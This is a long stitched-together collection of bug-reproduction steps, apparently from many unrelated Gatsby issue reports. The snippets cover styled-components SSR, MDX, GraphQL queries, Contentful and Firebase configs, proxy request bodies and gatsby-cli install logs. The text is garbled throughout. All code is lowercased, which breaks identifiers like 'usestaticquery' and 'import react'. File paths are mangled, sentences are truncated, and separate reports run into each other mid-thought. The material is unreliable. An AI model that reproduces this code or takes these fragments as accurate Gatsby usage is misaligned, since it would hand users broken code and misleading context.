manually in the current folder on my ec2 instance gatsby runs fine under pm2
it's this deploy it keeps failing for some reason.
* gatsby develop with `page.data.replace` is `false`
* render page
* change remote data source so `page.data.replace` becomes `true`
* hit the `__refresh` endpoint
* render the page
clone project at and follow `readme.md` instructions.
codebase: 1
connect repo to netlify
push repo to netlify
repository to [reproducible demo](
two branches: - `styled-components-4.4.1` (working)
- `styled-components-5.1.0` (not working) checkout branches and run `yarn build && yarn serve`
#### more details i using `wraprootelement` to add the `themeprovider`, `normalize` and my `globalstyles`
/** gatsby-ssr.js */
import react from 'react';
import { themeprovider } from 'styled-components';
import { normalize } from 'styled-normalize'; import { globalstyles } from './src/components/layout';
import { lighttheme } from './src/themes'; export const wraprootelement = ({ element }) => ( <themeprovider theme={lighttheme}> <normalize /> <globalstyles /> {element} </themeprovider>
``` i adding some css inside the `createglobalstyle` method and also additionally load two external css stylesheets at the end
the only css appearing in the `<head>` of the ssr html is the one from the two statically included files
all other styles disappear
/** global-styles.ts */
import { createglobalstyle } from 'styled-components'; import { themetype, themeprops } from '../../typings/theme';
import { lightcolors, darkcolors } from '../../themes/tokens/colors'; import globalcss from './styles/global.css';
import highlightcodeline from './styles/highlight-code-line.css'; export const globalstyles = createglobalstyle<{ theme: themetype & themeprops;
}>` /* all these styles disappear */ .light { --colorbackground: ${lightcolors.background}; --colortext: ${lightcolors.text}; } .dark { --colorbackground: ${darkcolors.background}; --colortext: ${darkcolors.text}; } /* the imported css of these files is still there */ ${globalcss} ${highlightcodeline}
run this configuration and put a 3-backtick code fence in one of your mdx pages: ```
module.exports = { sitemetadata: { title: `myproj`, description: `my project`, author: `me`, }, plugins: [ `gatsby-plugin-react-helmet`, { resolve: `gatsby-source-filesystem`, options: { name: `images`, path: `${__dirname}/src/images`, }, }, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-plugin-manifest`, options: { name: `gatsby-starter-default`, short_name: `starter`, start_url: `/`, background_color: `#663399`, theme_color: `#663399`, display: `minimal-ui`, icon: `src/images/gatsby-icon.png`, }, }, { resolve: "gatsby-plugin-web-font-loader", options: { google: { families: ["noto sans", "inconsolata", "roboto"], }, }, }, { resolve: `gatsby-plugin-mdx`, options: { defaultlayouts: { default: path.resolve("./src/components/layout.js") }, gatsbyremarkplugins: [ { resolve: `gatsby-remark-vscode`, }, ], }, }, ],
npm install -g gatsby-cli
install `gatsby-cli` globally.
try to create a new site with the gatsby cli per the tutorial (or run `gatsby -v` - any command will cause the failure it seems)
the above error is spat out
- perform a `yarn upgrade gatsby` - run `npm run develop -- --https` go to browser
create `gatsby-config.ts`
create npm scripts: "gatsby:ts": "ts-node -r tsconfig-paths/register -t ./node_modules/.bin/gatsby", "start": "npm run gatsby:ts -- develop",
see the index.mdx file and the layout component in /components
another test is made with create page api in gatsby-node and src/templates/blog-post.js
reproduction link:
don't know right now
* clone [gatsby](
* run `yarn` to install dependencies
* run `yarn develop`
this can be reproduced on `gatsby-starter-blog`:
gatsby new graphiql-test
cd graphiql-test
gatsby develop
``` open up graphiql: [` `]( and enter the following query:
query newbeginningspost($title: string!) { markdownremark(frontmatter: {title: {eq: $title}}) { frontmatter { title } }
``` in the query variable section, add the following:
{ "title": "new beginnings"
``` now update the query either directly in the query field, or using the explorer menu on the left-hand side.
this can be recreated with any new gatsby site, as long as it is using the current version of gatsby
for convenience, i have created a reproduction [here](
- create a ts file with ```ts
import type { gatsbyssr } from "gatsby" import react from "react" export const onrenderbody: gatsbyssr["onrenderbody"] = ({ setheadcomponents }) => { setheadcomponents([<link key="test" />])
``` - import it in `gatsby-ssr.js` like:
exports.onrenderbody = require("./src/gatsby/onrenderbody").onrenderbody
``` you might need to add `require("ts-node").register()` to `gatsby-config.js` to make ts work.
or you can just start from
go to
inspect element and select toggle device toolbar
you will see the page is not properly responsive
you can swap between the markdown and the regular page with the same screenshot
code available here.
* perform a clean fresh global install of gatsby-cli@2.12.22
`yarn global remove gatsby-cli`
`yarn global add gatsby-cli@2.12.22`
* create a new project with the default starter
`gatsby new my-project && cd my-project`
* run recipes command
`gatsby recipes` or `gatsby recipes emotion` (or any other recipe)
using `axios` as the request library, and assuming gatsby is set up to run on port `3000` and proxies a backend running on, say, port 8000: curl -x delete --data \'{"foo":"bar"}\' what gets sent to the server on port 8000 is a request with an empty request body
however, if you curl -x delete --data \'{"foo":"bar"}\' directly hitting the backend, the request body is present
**minimal reproducible example** 1
`npm run test` to instantiate the http server (port 10000) and gatsby (port 8000)
(see repo readme) in another terminal, use curl to post data to gatsby (which proxies the http server during development)
the response should include the data (and the other cli where you ran `npm run test` should log the post request body.
(see repo readme) now use the same curl command but with delete instead of post
gatsby does not forward the request and instead the query just hangs
according to the http spec, delete can have a request body, so the query is as expected
(indeed, if you directly delete request the server on port 10000, it correctly resolves as the post does)
unsure how to reproduce in another project but to see the issue 1
[open]( # the repo in gitpod
open in browser
see pwa installable
open the [deploy preview]
see the logs say that it failed alternatively, here are the screenshots development ![image]( deploy preview ![image](
install package import like below and use
import bigcalendar from "react-big-calendar-like-google"
import moment from "moment"
import "react-big-calendar-like-google/lib/css/react-big-calendar.css" <bigcalendar events={events} startaccessor="startdate" endaccessor="enddate" />
go to the [gatsby docs](
click on any arrow on the left-hand side
note direction.
- all steps were executed without any issue/error.
- in my "activity" tab on google cloud, i see successful connections during a deploy (generating bucket / pub/sub subscription): ```
gatsby-parallel-runner@gatsby-image-processing-277414.iam.gserviceaccount.com created kcvv-gatsby 6:13 pm create pub/sub subscription
gatsby-parallel-runner@gatsby-image-processing-277414.iam.gserviceaccount.com created gatsby-sub-1589645630253 6:13 pm create bucket
gatsby-parallel-runner@gatsby-image-processing-277414.iam.gserviceacc
visit
here is a repo of the code:
uses the same setup as mine, but happy to pair over zoom
use gatsby `2.21.19` to start develop server 1
should work fine
upgrade to `2.21.31` 1
errors out in console with `cannot read property 'tracer' of undefined` on fields that use custom schema resolver.
go to www.gatsbyjs.org/creators/
press "tab" on your keyboard
click the "skip to main content" button
here's my gatsby-node ```
// you can delete this file if you're not using it
const path = require('path');
const {slash} = require(\'gatsby-core-utils\'); exports.createpages = async ({graphql, actions}) =>{ const { createpage } = actions const result = await graphql(` query { custom{ portfolioitems{ nodes{ id, slug } } services{ nodes{ id, slug } } } } `) const posttemplate = path.resolve(\'./src/templates/portfolio.js\'); const servicetemplate = path.resolve(\'./src/templates/service.js\'); result.data.custom.portfolioitems.nodes.foreach(edge=>{ createpage({ // will be the url for the page path: "work/"+edge.slug, // specify the component template of your choice component: slash(posttemplate), // in the ^template\'s graphql query, \'id\' will be available // as a graphql variable to query for this posts\'s data
context: { id: edge.id, }, }) }) result.data.custom.services.nodes.foreach(edge => { createpage({ // will be the url for the page path: "services/"+edge.slug, // specify the component template of your choice component: slash(servicetemplate), // in the ^template\'s graphql query, \'id\' will be available // as a graphql variable to query for this posts\'s data
context: { id: edge.id, }, }) })
``` component:
import react from 'react';
import layout from '../components/layout';
import container from '../components/container';
import {graphql, usestaticquery} from 'gatsby'
import seo from \'../components/seo\'; const portfolio = (props) =>{ const query = graphql` query fetchdata($id: id!){ gszm{ portfolioitem(id: $id){ title, content } } } `; let data = usestaticquery(query); return <layout> <seo /> <container classname="py-12 text-center"> {/* <img src={item.featuredimage.url} alt={item.title} /> */} </container> </layout>
} export default portfolio;
``` response: <img width="1101" alt="screenshot 2020-05-13 at 20 17 02" src=" ">
cloned the gatsby ghost starter repo.
replaced the favicon files in the static folder within client with my own favicon files.
added a node server to serve the static pages
[
go to
navigate using the tab key until "view all posts" is selected
create a <a href={statehere}>statehere</a> link and make the href change based on a state
when using gatsby develop href changes, when using production env the href does not change.
i'm using the following query to select the thumbnails
the error occured after i added the `trim` argument
query testquery { allfile( filter: { relativedirectory: { eq: "people" }, name: { glob: "*_nah_*"} } ) { nodes { childimagesharp { fluid(maxwidth: 220, maxheight: 220, cropfocus: attention, fit: cover, trim: 1.5) { ...gatsbyimagesharpfluid_withwebp } } } }
visit using latest chrome version in incognito mode.
open audits tab in devtools (lighthouse) and run pwa test
reproduction repo: (default starter with several pages, `assetprefix` with bunnycdn setup, `gatsby-plugin-offline` setup)
simply use this plugin `gatsby-plugin-emotion` and run build.
clear cache - gatsby clear
run build - gatsby build --prefix-paths
run build again - gatsby build --prefix-paths
i already create code example here: click link "go to page /c" and wait a few seconds
it will thrown an error like i mention above.
`git clone `
`yarn workspace example develop`
this is the portion of gatsby.config.js for (not that it should matter)
```` { resolve: 'gatsby-plugin-sass', options: { useresolveurlloader: { options: { debug: true, sourcemap: true, }, }, }, },
* clone: `git clone `
* install dependencies: `npm install`
* run project: `npm start`
// gatsby-config.js
module.exports = { assetprefix: env.cdn_url, plugins:[ 'gatsby-plugin-manifest', 'gatsby-plugin-offline' ]
problem is coming from trying to parse a particular contentful setup i have with a heroimage and comma separated tags for each post so not sure how you would recreate.
repo:
use node v v13.6.0 with `"gatsby-plugin-google-analytics": "^2.1.31",` in package.json and upload to gatsby cloud and preview fails with error below
applying this query to an `.mdx` file throws the above error
remove `timetoread` and it runs
import { graphql } from \'gatsby\' export const query = graphql` fragment post on mdx { frontmatter { title slug date(formatstring: "mmm d, yyyy") tags } } excerpt(prunelength: 200) timetoread body }
clone build with --prefix-paths and start a server via the expressjs script named server.js (also under `yarn serve`)
open in browser:
this site demonstrates the problem: * see the `<mdxrenderer>` property in `src/templates/blog-post.js`
* run `gatsby develop` and view the "hello world" blog post to see `paul` displayed.
* run `gatsby build` and you should see the above error
(this site is based on [this mdx blog starter](
add export to your `gatsby-browser.js` ```js
exports.shouldupdatescroll = () => { console.log('should update scroll');
update the page and check that no message is present
npm install -g gatsby-cli
gatsby new myproject
cd myproject
gatsby develop
- `git clone `
- `npm install`
- add .env.development file with my github api key
- `npm start`
**option 1** is to clone and run it in a browser to observe the bug
replacing one of the image url with the following in `/src/posts/test.md` will show that the file name matters; `//images.ctfassets.net/wgbykpk4lo2v/1pxg4ivt7p8y3uwg8uqgez/bd8084807826e28d92738b147c59fd1e/andrew-neel-cckf4tshauw-unsplash.jpg` **option 2** is to create your own version of the repo above
create a gatsby site with `gatsby-plugin-mdx` and `gatsby-remark-images-contentful`
then, create a post with the following content (note: the images here are hosted on my personal contentful space): ```md
![image 1](//images.ctfassets.net/wgbykpk4lo2v/1xmx6pmioceakplhq4ssie/896966d66f01337171a39400e71bb75d/image.png) ![image 2](//images.ctfassets.net/wgbykpk4lo2v/20hbretydlelcotbuosh9f/b440c073102b1f61a9fef3585631e960/image.png)
``` then make a page template with the following content: ```jsx
import react from "react"
import { graphql } from "gatsby"
import { mdxprovider } from "@mdx-js/react"
import { mdxrenderer } from "gatsby-plugin-mdx" const indexpage = ({ data }) => { return ( <mdxprovider> <div style={{ margin: "0 auto", maxwidth: 1000, padding: 10 }}> <mdxrenderer>{data.post.body}</mdxrenderer> </div> </mdxprovider> )
}; export const query = graphql` query indexquery { post: mdx { body } }
`; export default indexpage;
here is the offending code ```
/** * layout component that queries for data * with gatsby's usestaticquery component * * see: */
import logrocket from 'logrocket';
import react, {usestate} from "react"
import proptypes from "prop-types"
import { usestaticquery, graphql, link } from "gatsby"
import styled from 'styled-components';
// import {nav, navfixed, navgrid, hamburger} from './common/navhome.js';
import { helmetdatocms } from 'gatsby-source-datocms';
import("./hamburger.css");
import("../sass/index.scss"); const layout = ({ children }) => { const data = usestaticquery(graphql` query sitetitlequery { datocmsfooter { footercopyright footeremail } site { sitemetadata { title } } datocmssite { globalseo { sitename titlesuffix twitteraccount facebookpageurl } } } `) /* toggle menu function*/ const [state, setstate] = usestate(false); function toggle() { setstate(!state); console.log(state); } /* toggle menu function ends*/ return ( <> <helmetdatocms> <title> {data.datocmssite.globalseo.sitename} -{data.datocmssite.globalseo.titlesuffix} </title> </helmetdatocms> <layoutwrapper> <navfixed> <navgrid> <hamburger onclick={toggle} classname={state ? `hamtog hamburger1 is-active hamburger--squeeze` : `hamtog hamburger1 hamburger--squeeze` } > <span classname="hamburger-box"> <span classname="hamburger-inner"></span> </span> </hamburger> <link classname="designer" to ="/">riel kitson</link> <nav classname={state ? `navigation active-ham` : `navigation` }> <link onclick={toggle} to ="/">home</link> <link onclick={toggle} to ="/about">about</link> <a href="/resume">resume</a> <link onclick={toggle} to ="/contact">contact</link> <link onclick={toggle} to ="/store">store</link> </nav> </navgrid> </navfixed> <main>{children}</main> <footer> {data.datocmsfooter.footercopyright} <span> | </span> <a href={`mailto:` + data.datocmsfooter.footeremail}> {data.datocmsfooter.footeremail} </a> </footer> </layoutwrapper> </> )
} layout.proptypes = { children: proptypes.node.isrequired,
} export default layout
``` deploy to heroku, set env variables in heroku, set procfile to `web: gatsby develop -p $port -h 0.0.0.0` you can view the site here you need to type the password gatsbyhelp to see the error i can go to the graphql playground and it works properly and can see all the data for the query it says it cant fetch
my data source uses the gatsby-plugin-mdx and @mdx-js plugins : - "@mdx-js/mdx": "1.6.1", - "@mdx-js/utils": "1.6.1", - "@mdx-js/react": "1.6.1", - "@mdx-js/runtime": "1.6.1", i am using mdx to query the **body** (not html) and wordcounts: ```graphql learnarticle(slug: { eq: $slug }, locale: { eq: $locale }) { childmdx { timetoread wordcount { words } tableofcontents body } ..
``` the data-source is a private db instance, but will try to come up with something to help you debug
following the exact steps of the gatsby tutorial: 1.
`gatsby new hello-world `
`cd hello-world`
`gatsby develop`
replace the contents of src/pages/index.js with: import react from "react"
export default function home() ( <div style={{ color: `purple`, fontsize: `72px` }}>hello gatsby!</div>
save index.js at this point, the build failures and returns this failure:
error #98123 webpack
generating development javascript bundle failed
e:\\gatsby-starter-hello-world\\src\\pages\\index.js: unexpected token, expected "{" (2:31) 1 | import react from "react"
> 2 | export default function home() ( | ^ 3 | <div style={{ color: `purple`, fontsize: `72px` }}>hello gatsby!</div> 4 | )
file: src\\pages\\index.js:2:31
failed re-building development bundle - 0.094s [minimal reproduction](
clone and change the file extensions of the shadowed files to `.jsx`
on `localhost:8000/about` you shouldn't see the the `subtitle` line.
[reproduce repo]( 1
install dependencies
run `yarn develop`
the contentful space being used is objectively not small, not sure if this may have an effect on it
my `gatsby-source-contentful` config is as such: ```
const contentfulconfig = { spaceid: process.env.contentful_space_id, accesstoken: process.env.contentful_access_token, host: process.env.contentful_host, downloadlocal: true,
with the access token being correctly set to the preview token and `contentful_host=preview.contentful.com`
clone a website - like gatsby starter
open in firefox (i'm using developer edition)
view the console error
unfortunately my site is in a private repo so cant share it here
$ git clone -b issue-gatsby-23633
$ cd gatsby-starter-try-ghost
$ gatsby develop
``` error log starting here:
success run queries - 0.717s - 28/28 39.08/s
warn plugin `gatsby-transformer-rehype` tried to define the graphql type error #85923 graphql there was an error in your graphql query: cannot query field "icon" on type "ghostsettings"
if you don\'t expect "icon" to exist on the type "ghostsettings" it is most likely a typo.
however, if you expect "icon" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "icon" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "ghostsettings":
#creating-type-definitions file: node_modules/gatsby-theme-try-ghost/src/components/common/headerindex.js:49:9
``` note that `gatsby build` doesn't throw any errors and that the produced build is working as expected.
create a drupal site that stores images on s3 (s3fs module for example)
connect to the site using 'gatsby-source-drupal' with basic authentication, and your remote images will fail to download.
still working on this
updated yoast premium to version 14.0 above error occurs
reverted back to yoast premium version 12.1 works
here the repo i working on: 1
run the site with `gatsby develop`
open localhost:8000
edit `src/essentials/home.json`
save changes
use gatsbyjs.org (www/ in this example) and build; you may hit oom, and you\'ll definitely see warnings a la ``` query takes too long: file path: /usr/src/app/www/www/src/templates/template-blog-post.js url path: /blog/2020-04-29-incredimental-builds/ context: { "slug": "/blog/2020-04-29-incredimental-builds/", "prev": { "title": "2 months and 2x performance: codebrahma accelerates serverless.com with gatsby", "link": "/blog/2020-04-27-building-serverless-site-faster-with-gatsby/" }, "next": null } ```
pin the version of gatsby-plugin-mdx to 1.2.1 (change was introduced in 1.2.2 -> and build.
no errors / no oom / etc.
clone
run `npm install`
run `npm run start`
error will pop up i've tried to disable as many plugins as possible in my `gatsby-config.js`, but still can't run the project.
import header from "../components/header" to index page.
- go to the showcase page and filter by "featured" ([link](
- select the [gm capital one]( showcase page
- click visit site
- open devtools
- note `ngcontent` used inside dom
compare urls from my [starter repo]( with a basic custom 404 page added.
here is a link to the site
if you inspect the console you will see what i am talking about:
clone this minimal reproduction repository:
run `yarn install` to install dependencies.
run `yarn start` to start the server.
when the server comes up, open ` ` in a web browser.
in graphiql, run this query (here\'s a [link]( ```graphql query myquery { testtesttest(path: {eq: "/mypage.html"}) { message } } ```
note that the query returns data for the `testtesttest` node.
go to ` `.
note that on the page, the value for `data.testtesttest.message` is null.
in the console, note that the data returned from the page query includes no data for the `topicinternalheadings` node: ``` {markdownremark: { }, testtesttest: null} ``` here's what's happening: in a [remark plugin]( i create a graphql node: ```
module.exports = async ({ markdownast, markdownnode, actions, createnodeid, createcontentdigest }) => { const { createnode } = actions; const testvalue = markdownnode.frontmatter.path; const testnode = { path: testvalue, message: \'hello!!!\', id: createnodeid(testvalue), children: [], internal: { description: `test`, type: "testtesttest", contentdigest: createcontentdigest(testvalue), content: testvalue, } }; await createnode(testnode); return markdownast;
``` in graphiql, i can verify that the node is created with [a simple query](
i access that node with this code in a [page component](
import react from "react"
import { graphql } from \'gatsby\' import layout from "../components/layout" const mainpage = ({ data }) => { const { markdownremark: post } = data; console.log(data) return ( <layout> <div>value of data.testtesttest: {json.stringify(data.testtesttest) || \'null\'}</div> <div>value of markdownremark.frontmatter.path: {data.markdownremark.frontmatter.path}</div> <h2>content</h2> <div classname="content" dangerouslysetinnerhtml={{ __html: post.html }} /> </layout> )
} export default mainpage; export const pagequery = graphql`
query topicsbypath($path: string!) { markdownremark(frontmatter: {path: {eq: $path}}) { html frontmatter { path title } } testtesttest(path: {eq: $path}) { message }
clone repository
`yarn` then `yarn start`
inspect an element on the page using any browser dev tool (for example the heading "gatsby starter blog"
refresh the browser
notice how the dom is re-rendered (dev tool dom collapses)
clone [this repository]( the diff from gatsby-stater-blog is [here](
install dependencies
run `yarn build`
look into `public/hello-world/index.html` and find `kabutack.gif`
this img's url is wired (it's `/https:/cdn.jsdelivr.net/gh/leadream/juuun.io@gh-pages/63c893e9f09f78fd314f5205a266006f/kabutack.gif`)
if you check gatsby preview on site:
the result returns (n/a means the data in backreference are not present):
design-inspiration (n/a)
gatsby (n/a)
typography (n/a)
``` but if you try to [run the query on the same environment vie graphiql]( ```gql
query myquery { allkontentitemcategory(filter: {preferred_language: {eq: "en-us"}}) { nodes { elements { title { value } } used_by_articles { system { codename } } } }
``` ### implementation i am using `createschemacustomization` hook in gatsby-node.js #l10 to extend the `kontent_item_category` type
the implementation of schema customization is here: < #l27..l66>
i was getting missing images when deploying to netlify so i cleaned my local install then started getting these errors when i run`npm install` or `gatsby build` - this is my repo.
- create an app with gatsby-source-contentful setup.
- create a content model and create a content of that type
- run `gatsby develop`
- open
you will see the content model with the initial name, everything is ok - modify the display name of the content model (content model > select your content model > edit on the top, next to the name)
- run `gatsby develop`
error in the console
if you open you\'ll see that you can query type with the "new name" `allcontentful<camelcasednewname>`)
- setup gatsby - add the mdx plugin
- add an `assetprefix` to `gatsby-config.js`
- create a mdx file containing a relative link
- run `gatsby build --prefix-paths`
- observe in index.html that the `assetprefix` has been added to the link
`git clone `
`gatsby build`
`gatsby serve`
open in browser
view web page using developer tools for a mobile view
refresh page
(for safari) 1
create new gatsby site with the `gatsby-starter-default`
load the index page with safari dev tools open and caching disabled
check the network tab to see that the same `gatsby-astronaut.png` is requested 4 times ### steps to reproduce (for firefox) 1
create new gatsby site with the `gatsby-starter-default`
load the index page with firefox dev tools open and caching disabled
check the network tab while reloading the page in quick succession to see that that the same `gatsby-astronaut.png` sometimes is requested once and sometimes twice.
`npx gatsby new bug-repro`
`yarn add @tippyjs/react gatsby-plugin-preact`
add the preact plugin to `gatsby.config.js`
edit `index.js` with ```jsx
import react from "react"
import { link } from "gatsby"
import tippy from "@tippyjs/react" import layout from "../components/layout"
import image from "../components/image"
import seo from "../components/seo" const indexpage = () => ( <layout> <seo title="home" /> <tippy content="test"> <button>test</button> </tippy> </layout>
) export default indexpage
here [an example project to demonstrate the problem](
run it with `npm install && npx gatsby develop`.
- include a large css that will be inlined by gatsby (bootstrap scss imports in my case)
- publish site
- copy a page address from the page to whatsapp
it should show link preview shortly after, but it does not show.
deploy using vercel.
example [repo]( 1
use using-gatsby-source-graphql from gatsby examples
in gatsby-node.js use createresolvers function to create custom query on 3rd party data
//gatsby-node.js exports.createresolvers = ({ actions, cache, createnodeid, createresolvers, store, reporter,
}) => { const { createnode } = actions createresolvers({ query: { allblogposttitles: { type: [`string!`], resolve(source, args, context, info) { const items = context.nodemodel.getallnodes({ type: `graphcms_blogpost`, }); return items.map(i => i.title); } } }, graphcms_blogpost: { .....
example repo: 1
use using-gatsby-source-graphql from gatsby examples
in gatsby-node.js use createschemacustomization to update/define new field on 3rd party type
//gatsby-node.js exports.createschemacustomization = async ({ actions }) => { const { createtypes } = actions; const typedefs = ` type graphcms_blogpost implements node { newfield: string! } `; createtypes(typedefs);
as the issue seems to rely on async processing and depending on amount of graphql nodes to process, i wasn't able to create a *minimal* reproduction test case
but the project i'm working on is open source, so you may reproduce the error with it:
*build may take several minute to complete* ```shell
$ git clone --branch test-case --depth=1
$ npm ci && npm run build
$ # build success $ npm i gatsby-transformer-remark@2.7.4
$ npm run clean && npm run build
$ # build fail
adding @ckeditor/ckeditor5-react to a component implemented ckeditor
it works in codebox works, however building does not
- configure `gatsby-source-contentful` with `host: 'preview.contentful.com'`
- run `gatsby develop`
- add an entry to contentful space
- restart gatsby develop
- the new entry appears in graphql (and on a page if it renders entries of that type)
- delete that entry from contentful space
- restart gatsby develop
- the entry still appears in graphql and on a page
i've made the project public, so you can hopefully reproduce the errors i got
here is the gist with the original bugs.
[repository link](
the `source` branch contains the project source code and the `master` branch is the rendered static site deployed to github pages
[deployed site link](
the deployment was done as per the gatsby guide on deploying to github pages.
check and run it on a small ulimit
for my case, `ulimit -n` is 1024.
for sample, "gatsby-starter-prologue" starter does not show up in site while it is present in starters.yml
add the following plugin configuration: ```javascript
{ resolve: `gatsby-remark-images`, options: { maxwidth: 1000, quality: 80, jpegprogressive: true, pngcompressionlevel: 9, sizebypixeldensity: true, linkimagestooriginal: false, showcaptions: false, },
``` use an image with resolution `144`
ensure that it renders at half the actual horizontal pixels.
to reproduce, add the gatsby-plugin-netlify-cache plugin to the default starter and build it on netlify
(see config below.) rebuild the site, and you will see the images being processed a second time, even though they already existed in the /public/static folder
roll back the version of gatsby-transformer-sharp to a version prior to the jobs api v2 change, and suddenly rebuilds will used the cached images correctly
``` { resolve: `gatsby-plugin-netlify-cache`, options: { cachepublic: true, }, },
can u help me figure it out? **project repo**: **post on github issues:** **my gatsby-node:** ```
exports.oncreatewebpackconfig = ({ stage, actions, getconfig }) => { if (stage === 'build-html') { actions.setwebpackconfig({ externals: getconfig().externals.concat(function(context, request, callback) { const regex = /^@?firebase(\\/(.+))?/; if (regex.test(request)) { return callback(null, `umd ${request}`); } callback(); }), }); }
**my firebase dependencies:**
``` "@firebase/firestore-types": "^1.10.1", "firebase": "^7.13.1", "firebase-admin": "^8.10.0", "firebase-functions": "^3.5.0", "firebase-tools": "^7.16.1",
**firebase index file:**
import firebase from 'firebase/app';
import 'firebase/firestore';
import 'firebase/auth';
import 'firebase/storage';
import 'firebase/analytics';
const firebaseconfig = {...};
firebase.initializeapp(firebaseconfig);
export const firestore = firebase.firestore();
export const auth = firebase.auth();
export const storage = firebase.storage();
- create a new gatsby site using typescript
- type a page component as `react.fc<pageprops>`
- check its `props.location.state` type: it's `{}`
the `pageprops` type has a `datatype` and a `pagecontexttype` arguments, but it's missing a `statetype` argument to be passed down to `windowlocation` and `hlocation` (that one does have a `<s = locationstate>` param).
visit and look at the results and default sort parameter used.
$ npm install -g gatsby-cli $ npm --version
6.14.4 acer@acer-supermars mingw64 ~
$ node --version
v13.13.0 cd /d to folder gatsby develop or gatsby new "name" windows 10 with git bash
------------------------------------------ ran acer@acer-supermars mingw64 ~
$ npm install -g gatsby-cli npm warn deprecated core-js@2.6.11: core-js@<3 is no longer maintained and not recommended for usage due to the number of issues
please, upgrade your dependencies to the actual version of core-js@3.
npm warn deprecated resolve-url@0.2.1: #deprecated
npm warn deprecated urix@0.1.0: please see #deprecated
c:\\users\\acer\\gatsby -> c:\\users\\acer\ ode_modules\\gatsby-cli\\lib\\index.js > gatsby-cli@2.11.12 postinstall c:\\users\\acer\ ode_modules\\gatsby-cli
> node scripts/postinstall.js success! welcome to the gatsby cli! please visit for more information
usage: gatsby <command> [options] commands: gatsby develop start development server
watches files, rebuilds, and hot reloads if something changes gatsby build build a gatsby project
gatsby serve serve previously built gatsby site
gatsby info get environment information for debugging and issue reporting gatsby clean wipe the local gatsby environment including built assets and cache gatsby repl get a node repl with context of gatsby environment, see ( gatsby recipes [recipe] [experimental] run a recipe gatsby new [rootpath] [starter] create new gatsby project
gatsby plugin useful commands relating to gatsby plugins gatsby telemetry enable or disable gatsby anonymous analytics collection
options: --verbose turn on verbose output [boolean] [default: false] --no-color, --no-colors turn off the color in output [boolean] [default: false] --json turn on the json logger [boolean] [default: false] -h, --help show help [boolean] -v, --version show the version of the gatsby cli and the gatsby package in the current project [boolean]
npm warn optional skipping optional dependency: fsevents@^1.2.7 (node_modules\\gatsby-cli\ ode_modules\\chokidar\ ode_modules\\fsevents):
npm warn notsup skipping optional dependency: unsupported platform for fsevents@1.2.12: wanted {"os":"darwin","arch":"any"} (current: {"os":"win32","arch":"x64"})
npm warn babel-loader@8.1.0 requires a peer of webpack@>=2 but none is installed
you must install peer dependencies yourself.
npm warn babel-eslint@10.1.0 requires a peer of eslint@>= 4.12.1 but none is installed
you must install peer dependencies yourself.
npm warn babel-plugin-remove-graphql-queries@2.8.3 requires a peer of gatsby@^2.0.0 but none is installed
you must install peer dependencies yourself.
npm warn url-loader@1.1.2 requires a peer of webpack@^3.0.0 || ^4.0.0 but none is installed
you must install peer dependencies yourself.
npm warn acorn-dynamic-import@4.0.0 requires a peer of acorn@^6.0.0 but none is installed
you must install peer dependencies yourself.
npm warn optional skipping optional dependency: abbrev@1.1.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\abbrev):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\abbrev' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.abbrev.delete'
npm warn optional skipping optional dependency: ansi-regex@2.1.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\ansi-regex):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\ansi-regex' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.ansi-regex.delete'
npm warn optional skipping optional dependency: aproba@1.2.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\aproba):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\aproba' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.aproba.delete'
npm warn optional skipping optional dependency: balanced-match@1.0.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\balanced-match):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\balanced-match' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.balanced-match.delete'
npm warn optional skipping optional dependency: chownr@1.1.4 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\chownr):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\chownr' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.chownr.delete'
npm warn optional skipping optional dependency: code-point-at@1.1.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\code-point-at):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\code-point-at' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.code-point-at.delete'
npm warn optional skipping optional dependency: concat-map@0.0.1 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\concat-map):
npm warn enoent skipping optional dependency: enoent: no such file or directory, rename 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\concat-map' -> 'c:\\users\\acer\ ode_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\.concat-map.delete'
npm warn optional skipping optional dependency: console-control-strings@1.1.0 (node_modules\\gatsby-cli\ ode_modules\\fsevents\ ode_modules\\console-control-strings):
